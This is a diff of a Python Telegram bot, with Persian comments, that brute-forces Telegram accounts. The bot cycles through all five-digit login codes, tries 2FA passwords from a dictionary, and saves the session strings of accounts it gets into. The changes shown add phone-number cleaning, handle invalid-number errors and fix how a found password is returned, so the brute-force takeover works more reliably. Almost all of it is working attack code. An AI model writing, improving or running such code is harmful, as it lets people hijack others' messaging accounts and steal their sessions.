@@ -8,7 +8,7 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError, PhoneNumberInvalidError
 import urllib.request
 
 # ============ تنظیمات ============
@@ -89,8 +89,16 @@ def delete_webhook():
         return False
 
 def is_valid_phone(text):
+    # حذف کاراکترهای غیرعددی به جز +
     phone = re.sub(r'[^0-9+]', '', text)
+    # اگر با + شروع شد، حذفش کن
+    if phone.startswith('+'):
+        phone = phone[1:]
     return len(phone) >= 10
+
+def clean_phone(text):
+    # حذف همه چیز به جز اعداد
+    return re.sub(r'[^0-9]', '', text)
 
 def is_valid_api_id(text):
     return text.isdigit()
@@ -177,7 +185,7 @@ async def new_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 <b>مثال:</b> <code>989123456789</code>
 
-⚠️ شماره را بدون علامت (+) وارد کنید.
+⚠️ شماره را <b>بدون علامت (+)</b> وارد کنید.
 """
     
     keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
@@ -196,11 +204,12 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
         return
     
-    phone = re.sub(r'[^0-9+]', '', text)
+    # پاک کردن شماره از هر چیزی غیر از عدد
+    phone = clean_phone(text)
     
     if not is_valid_phone(phone):
         await update.message.reply_text(
-            "❌ شماره تلفن نامعتبر است!\n\nمثال: <code>989123456789</code>",
+            "❌ شماره تلفن نامعتبر است!\n\n⚠️ شماره را بدون + وارد کنید.\n<b>مثال:</b> <code>989123456789</code>",
             parse_mode='HTML'
         )
         return
@@ -280,6 +289,15 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         try:
             await client.send_code_request(phone)
+        except PhoneNumberInvalidError:
+            await context.bot.edit_message_text(
+                f"❌ شماره تلفن نامعتبر است!\n\nشماره: <code>{phone}</code>\n\n⚠️ مطمئن شوید شماره را به درستی وارد کرده‌اید.\n<b>مثال:</b> <code>989123456789</code>",
+                chat_id=update.effective_chat.id,
+                message_id=msg.message_id,
+                parse_mode='HTML'
+            )
+            await clear_user_session(user_id)
+            return
         except FloodWaitError as e:
             await context.bot.edit_message_text(
                 f"⏳ محدودیت تلگرام! {e.seconds} ثانیه صبر کنید...",
@@ -314,6 +332,7 @@ async def bruteforce_password(update, context, user_id, client, msg):
         total_passwords = len(PASSWORD_DICT)
         attempt = 0
         found = False
+        found_password = None
         
         # پیام شروع حدس پسورد
         await context.bot.edit_message_text(
@@ -333,7 +352,6 @@ async def bruteforce_password(update, context, user_id, client, msg):
         for password in PASSWORD_DICT:
             attempt += 1
             
-            # هر 10 تلاش، پیام رو بروزرسانی کن
             if attempt % 10 == 0:
                 try:
                     await context.bot.edit_message_text(
@@ -356,6 +374,7 @@ async def bruteforce_password(update, context, user_id, client, msg):
             try:
                 await client.sign_in(password=password)
                 found = True
+                found_password = password
                 break
                 
             except FloodWaitError as e:
@@ -377,11 +396,10 @@ async def bruteforce_password(update, context, user_id, client, msg):
                 await asyncio.sleep(wait_time + 2)
                 continue
                 
-            except Exception as e:
-                # پسورد اشتباه - ادامه بده
+            except Exception:
                 continue
         
-        return found, attempt, password if found else None
+        return found, attempt, found_password
         
     except Exception as e:
         logger.error(f"Error in bruteforce_password: {e}")
@@ -412,12 +430,10 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
             parse_mode='HTML'
         )
         
-        # حدس زدن از 00000 تا 99999
         for code_num in range(total_attempts):
             code = str(code_num).zfill(5)
             attempt += 1
             
-            # هر 1000 تلاش، پیام رو بروزرسانی کن
             if attempt % 1000 == 0:
                 try:
                     await context.bot.edit_message_text(
@@ -489,11 +505,9 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                 )
                 
                 if password_found and pass_found:
-                    # پسورد پیدا شد!
                     session_string = client.session.save()
                     await client.disconnect()
                     
-                    # دریافت نام اکانت
                     account_name = "بدون نام"
                     try:
                         client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
@@ -505,7 +519,6 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                     except:
                         pass
                     
-                    # ذخیره اطلاعات
                     user_id_str = str(user_id)
                     if user_id_str not in self_data:
                         self_data[user_id_str] = []
@@ -557,7 +570,6 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                     )
                     return
                 else:
-                    # پسورد پیدا نشد
                     await context.bot.edit_message_text(
                         f"""
 ❌ <b>پسورد 2FA پیدا نشد!</b>
@@ -582,11 +594,9 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                 continue
         
         if found and code_found:
-            # کد پیدا شد و پسوردی نیاز نبود
             session_string = client.session.save()
             await client.disconnect()
             
-            # دریافت نام اکانت
             account_name = "بدون نام"
             try:
                 client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
@@ -598,7 +608,6 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
             except:
                 pass
             
-            # ذخیره اطلاعات
             user_id_str = str(user_id)
             if user_id_str not in self_data:
                 self_data[user_id_str] = []
@@ -648,7 +657,6 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
             )
             
         else:
-            # کد پیدا نشد
             await context.bot.edit_message_text(
                 f"""
 ❌ <b>کد تایید پیدا نشد!</b>
@@ -707,7 +715,6 @@ async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session_string = client.session.save()
         await client.disconnect()
         
-        # دریافت نام اکانت
         account_name = "بدون نام"
         try:
             client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
